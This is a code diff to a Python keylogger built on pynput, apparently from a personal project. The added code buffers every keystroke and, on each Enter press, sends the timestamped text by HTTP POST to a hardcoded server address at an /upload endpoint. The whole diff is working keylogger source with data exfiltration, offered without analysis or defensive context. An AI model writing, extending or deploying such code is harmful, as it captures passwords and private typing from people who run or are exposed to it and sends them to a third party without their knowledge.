@@ -1,7 +1,11 @@
 from pynput import keyboard
+import time
+import requests
 
-text = "" # Initialize an empty string to store logged keys
-time_interval = 10  # Time interval in seconds
+URL = "http://192.168.39.184:5000/upload"
+
+buffer = "" # Initialize an empty buffer to store keystrokes
+
 # Define the callback function to handle key presses
 def key_to_string(key):
     if hasattr(key, 'char'):
@@ -48,8 +52,31 @@ def key_to_string(key):
         }
         return key_map.get(key, f"[{key}]") # Not mapped keys
 
+def send_buffer(Data):
+    headers = {'Content-Type': 'text/plain'}
+    try:
+        response = requests.post(URL, data=Data, headers=headers, timeout=5)
+        if response.status_code == 200:
+            return True
+        else:
+            return False
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
+
+
 def on_press(key):
-    print(key_to_string(key))
+    global buffer
+    key_str = key_to_string(key)
+    
+    if key == keyboard.Key.enter:
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+        datos_a_enviar = f"<{timestamp}> {buffer}\n"
+        success = send_buffer(datos_a_enviar)
+        if success:
+            buffer = ""  # clear buffer if sent successfully
+    else:
+        buffer += key_str # Append the key string to the buffer if sent failed
 
 # Start listening to keyboard events
 with keyboard.Listener(on_press=on_press) as listener:
